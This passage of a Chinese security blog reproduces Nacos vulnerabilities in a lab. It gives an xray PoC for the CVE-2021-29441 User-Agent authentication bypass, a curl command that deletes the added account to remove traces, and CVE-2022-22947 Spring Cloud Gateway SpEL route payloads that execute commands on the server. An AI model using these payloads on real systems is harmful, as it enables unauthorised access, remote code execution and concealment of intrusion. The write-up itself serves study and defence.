+<p>这里就直接以test账号登录了</p>
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529123320571.png" srcset="/img/loading.gif" lazyload alt="image-20230529123320571"></p>
+<p>当然对于这个poc有一个问题就是留痕了</p>
+<p>在xray的poc中我发现可以通过delete方法删除掉这个用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -XDELETE <span class="hljs-string">&#x27;http://127.0.0.1:8848/nacos/v1/auth/users?username=test&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">poc-yaml-alibaba-nacos-v1-auth-bypass</span><br><span class="hljs-attr">manual:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">transport:</span> <span class="hljs-string">http</span><br><span class="hljs-attr">set:</span><br>    <span class="hljs-attr">r1:</span> <span class="hljs-string">randomLowercase(16)</span><br>    <span class="hljs-attr">r2:</span> <span class="hljs-string">randomLowercase(16)</span><br><span class="hljs-attr">rules:</span><br>    <span class="hljs-attr">r0:</span><br>        <span class="hljs-attr">request:</span><br>            <span class="hljs-attr">cache:</span> <span class="hljs-literal">true</span><br>            <span class="hljs-attr">method:</span> <span class="hljs-string">POST</span><br>            <span class="hljs-comment"># 增加了 bypass 的方式</span><br>            <span class="hljs-attr">path:</span> <span class="hljs-string">/nacos/v1/auth/users/?username=&#123;&#123;r1&#125;&#125;&amp;password=&#123;&#123;r2&#125;&#125;</span><br>            <span class="hljs-attr">headers:</span><br>                <span class="hljs-attr">User-Agent:</span> <span class="hljs-string">Nacos-Server</span><br>        <span class="hljs-attr">expression:</span> <span class="hljs-string">response.status</span> <span class="hljs-string">==</span> <span class="hljs-number">200</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">response.body.bcontains(bytes(&quot;create</span> <span class="hljs-string">user</span> <span class="hljs-string">ok!&quot;))</span><br>    <span class="hljs-attr">r1:</span><br>        <span class="hljs-attr">request:</span><br>            <span class="hljs-attr">cache:</span> <span class="hljs-literal">true</span><br>            <span class="hljs-attr">method:</span> <span class="hljs-string">GET</span><br>            <span class="hljs-attr">path:</span> <span class="hljs-string">/nacos/v1/auth/users/?pageNo=1&amp;pageSize=999</span><br>            <span class="hljs-attr">headers:</span><br>                <span class="hljs-attr">User-Agent:</span> <span class="hljs-string">Nacos-Server</span><br>        <span class="hljs-attr">expression:</span> <span class="hljs-string">response.status</span> <span class="hljs-string">==</span> <span class="hljs-number">200</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">response.body.bcontains(bytes(r1))</span><br>    <span class="hljs-attr">r2:</span><br>        <span class="hljs-attr">request:</span><br>            <span class="hljs-attr">cache:</span> <span class="hljs-literal">true</span><br>            <span class="hljs-attr">method:</span> <span class="hljs-string">DELETE</span><br>            <span class="hljs-attr">path:</span> <span class="hljs-string">/nacos/v1/auth/users/?username=&#123;&#123;r1&#125;&#125;</span><br>            <span class="hljs-attr">headers:</span><br>                <span class="hljs-attr">User-Agent:</span> <span class="hljs-string">Nacos-Server</span><br>        <span class="hljs-comment"># 不需要判断这个条件</span><br>        <span class="hljs-attr">expression:</span> <span class="hljs-string">&quot;true&quot;</span><br><span class="hljs-attr">expression:</span> <span class="hljs-string">r0()</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">r1()</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">r2()</span><br><span class="hljs-attr">detail:</span><br>    <span class="hljs-attr">author:</span> <span class="hljs-string">kmahyyg(https://github.com/kmahyyg)</span><br>    <span class="hljs-attr">links:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/alibaba/nacos/issues/4593</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/alibaba/nacos/issues/4701</span><br>    <span class="hljs-attr">vulnerability:</span><br>        <span class="hljs-attr">id:</span> <span class="hljs-string">CT-153900</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="4-漏洞原理"><a href="#4-漏洞原理" class="headerlink" title="4. 漏洞原理"></a>4. 漏洞原理</h3><h4 id="Spring-Cloud-Gateway"><a href="#Spring-Cloud-Gateway" class="headerlink" title="Spring Cloud Gateway"></a>Spring Cloud Gateway</h4><p><code>Spring Cloud Gateway</code>提供了一种灵活而强大的方式来路由和过滤传入的请求，使开发人员能够构建高度可定制的API网关。它可以用作传统的反向代理，也可以用于实现更复杂的路由规则和过滤器链</p>
+<ol>
+<li>路由功能：根据请求的URL路径将请求路由到相应的服务。它支持动态路由，可以根据配置或服务注册中心的信息动态调整路由规则</li>
+<li>过滤器功能：Spring Cloud Gateway提供了一系列内置的过滤器，用于对请求和响应进行处理</li>
+<li>监控和指标：通过集成Spring Boot Actuator和其他监控工具来实时监控网关的性能和健康状况</li>
+</ol>
+<p>虽然说它还有很多其他功能，如负载均衡，断路器支持，但都不在我们讨论范围之内，值得一提的是Actuator，这是利用它来进行RCE的核心，需要nacos配合它主要就是因为它一般不在公网上开放</p>
+<h4 id="Nacos"><a href="#Nacos" class="headerlink" title="Nacos"></a>Nacos</h4><p><code>Nacos</code>可以理解为一个统一管理的配置注册中心，配置了nacos后，项目中的配置文件便可以通过Nacos来动态修改。应用通过注册到Nacos中，然后绑定组和dataID的形式，来绑定Nacos上创建的动态配置文件，当Nacos上所绑定的配置文件发布了新版时，应用将从Nacos中自动同步新的配置，大大增加了灵活性</p>
+<h4 id="CVE-2022-22947"><a href="#CVE-2022-22947" class="headerlink" title="CVE-2022-22947"></a>CVE-2022-22947</h4><p>该漏洞在网上公开POC的利用方式是通过<code>/actuator/gateway/routes</code>这个节点进行动态添加路由的，当项目配置文件中配置了以下两行配置时（YAML格式），便会开启该接口：</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">management.endpoint.gateway.enabled</span>: <span class="hljs-string">true</span><br><span class="hljs-attr">management.endpoints.web.exposure.include</span>: <span class="hljs-string">gateway</span><br></code></pre></td></tr></table></figure>
+
+<p>其中发送的添加路由的数据包中的数据段如下：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml">&#123;<br>  <span class="hljs-attr">&quot;id&quot;:</span> <span class="hljs-string">&quot;test&quot;</span>,<br>  <span class="hljs-attr">&quot;filters&quot;:</span> [&#123;<br>    <span class="hljs-attr">&quot;name&quot;:</span> <span class="hljs-string">&quot;AddResponseHeader&quot;</span>,<br>    <span class="hljs-attr">&quot;args&quot;:</span> &#123;<span class="hljs-attr">&quot;name&quot;:</span> <span class="hljs-string">&quot;Result&quot;</span>,<span class="hljs-attr">&quot;value&quot;:</span> <span class="hljs-string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span>&#125;<br>  &#125;],<br><span class="hljs-attr">&quot;uri&quot;:</span> <span class="hljs-string">&quot;http://example.com&quot;</span>,<br><span class="hljs-attr">&quot;order&quot;:</span> <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>通过POST请求任意一个路由，携带上这个数据段</p>
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529150007041.png" srcset="/img/loading.gif" lazyload alt="image-20230529150007041"></p>
+<p>刷新路由</p>
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529150122608.png" srcset="/img/loading.gif" lazyload alt="image-20230529150122608"></p>
+<p>请求刚刚添加的路由</p>
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529150102933.png" srcset="/img/loading.gif" lazyload alt="image-20230529150102933"></p>
+<p>我们可以先理解一下这段POC的含义，其中id字段代表的是路由的ID标识，而filters则是Spring Cloud Gateway中路由配置的过滤器，这里指定了过滤器<code>AddResponseHeader</code>，含义为对匹配到的请求的响应包中添加一个自定义的Header，其中名称为 Result，值为该漏洞利用的SpEL表达式，执行了命令<code>id</code>，也就是说当一个请求匹配到该路由时，返回包中应该会存在一个Header返回了我们定义的键值，利用成功的话会得到：<code>result: uid=0(root) gid=0（...）</code></p>
+<p>但POC中并未定义路由的匹配规则，因为开启actuator&#x2F;gateway的话需要刷新一下路由然后直接查看路由配置就可以得到命令执行的回显了。为了验证，需要添加一条路由规则如下：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml">&#123;<br>    <span class="hljs-attr">&quot;id&quot;:</span> <span class="hljs-string">&quot;test&quot;</span>,<br>    <span class="hljs-attr">&quot;order&quot;:</span> <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;predicates&quot;:</span> [<br>      &#123;<br>        <span class="hljs-attr">&quot;args&quot;:</span> &#123;<br>          <span class="hljs-attr">&quot;_genkey_0&quot;:</span> <span class="hljs-string">&quot;/test/**&quot;</span><br>        &#125;,<br>        <span class="hljs-attr">&quot;name&quot;:</span> <span class="hljs-string">&quot;Path&quot;</span><br>      &#125;<br>    ],<span class="hljs-attr">&quot;filters&quot;:</span> [<br>&#123;<br>    <span class="hljs-attr">&quot;name&quot;:</span> <span class="hljs-string">&quot;AddResponseHeader&quot;</span>,<br>    <span class="hljs-attr">&quot;args&quot;:</span> &#123;<br><span class="hljs-string">&quot;name&quot;</span><span class="hljs-string">:&quot;result&quot;</span>,<span class="hljs-attr">&quot;value&quot;:</span> <span class="hljs-string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream())).replaceAll(\&quot;\n\&quot;,\&quot;\&quot;).replaceAll(\&quot;\r\&quot;,\&quot;\&quot;)&#125;&quot;</span>&#125;<br>  &#125;],<br>    <span class="hljs-attr">&quot;uri&quot;:</span> <span class="hljs-string">&quot;http://example.com&quot;</span><br>  &#125;<br></code></pre></td></tr></table></figure>
+
+<p>比较可惜的是vulhub是写死了默认路由，只要收到的是Get请求一律转到example这个网站，而且优先级是最高的，所以创建的&#x2F;test路由不起作用</p>
+<p>正常情况下请求<code>/test/</code>的话应当会在请求头里面带上<code>restlt: 回显信息</code> </p>
+<p>比如：</p>
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529151053495.png" srcset="/img/loading.gif" lazyload alt="image-20230529151053495"></p>
+<h4 id="CNVD-2023-17316-1"><a href="#CNVD-2023-17316-1" class="headerlink" title="CNVD-2023-17316"></a>CNVD-2023-17316</h4><p>它的主要原因是默认配置下未对<code>token.secret.key</code>进行修改，导致远程攻击者可以通过使用默认的key生成token绕过认证进入后台</p>
+<p>这个和shiro的反序列化漏洞很相似</p>
+<h4 id="CVE-2021-29441"><a href="#CVE-2021-29441" class="headerlink" title="CVE-2021-29441"></a>CVE-2021-29441</h4><p>在 1.4.1 及更早版本的Nacos中，当配置为使用身份验证（Dnacos.core.auth.enabled&#x3D;true）时，会使用 AuthFilter servlet过滤器来强制实施身份验证，从而跳过身份验证检查。此机制依赖于用户代理 HTTP 标头，因此很容易被欺骗。此问题可能允许任何用户在 Nacos 服务器上执行任何管理任务。</p>
+<h3 id="5-Reference"><a href="#5-Reference" class="headerlink" title="5. Reference"></a>5. Reference</h3><h4 id="Blog-amp-Notes"><a href="#Blog-amp-Notes" class="headerlink" title="Blog&amp;Notes"></a>Blog&amp;Notes</h4><p>Nacos结合Spring Cloud Gateway RCE利用</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11493">https://xz.aliyun.com/t/11493</a></p>
+<p>xray&#x2F;alibaba-nacos-v1-auth-bypass.yml</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/chaitin/xray/blob/master/pocs/alibaba-nacos-v1-auth-bypass.yml">https://github.com/chaitin/xray/blob/master/pocs/alibaba-nacos-v1-auth-bypass.yml</a></p>
+<p>CVE-2022-22947 远程代码执行漏洞复现分析</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/324386.html">https://www.freebuf.com/vuls/324386.html</a></p>
+<p>Nacos 身份认证绕过漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50854662/article/details/129660330">https://blog.csdn.net/qq_50854662/article/details/129660330</a></p>
+<p>CVE-2021-29441</p>
+<p><a target="_blank" rel="noopener" href="https://wiki.hgsec.top/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%BA%93/Nacos/CVE-2021-29441%20Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/">https://wiki.hgsec.top/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%BA%93/Nacos/CVE-2021-29441%20Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</a></p>
+<p>Report a security vulnerability in nacos to bypass authentication</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/issues/4593">https://github.com/alibaba/nacos/issues/4593</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/issues/4701">https://github.com/alibaba/nacos/issues/4701</a></p>
+<p><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2020-325_326-nacos/">https://securitylab.github.com/advisories/GHSL-2020-325_326-nacos/</a></p>
+<p>Nacos Client Yaml反序列化漏洞分析</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10355">https://xz.aliyun.com/t/10355</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/spring-cloud-alibaba/issues/1910">https://github.com/alibaba/spring-cloud-alibaba/issues/1910</a></p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AE%9E%E6%88%98/" class="category-chain-item">实战</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AE%9E%E6%88%98/">#实战</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Nacos相关漏洞复现</div>
+      <div>https://c47sh4rk.github.io/2023/05/29/Nacos相关漏洞复现/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>C47Sh4rk</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年5月29日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/11/18/%E5%A4%96%E9%83%A8%E4%BE%A6%E6%9F%A5/" title="外部侦查">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">外部侦查</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/05/06/Lampiao-Walkthrouth/" title="Lampiao-Walkthrouth">
+                        <span class="hidden-mobile">Lampiao-Walkthrouth</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
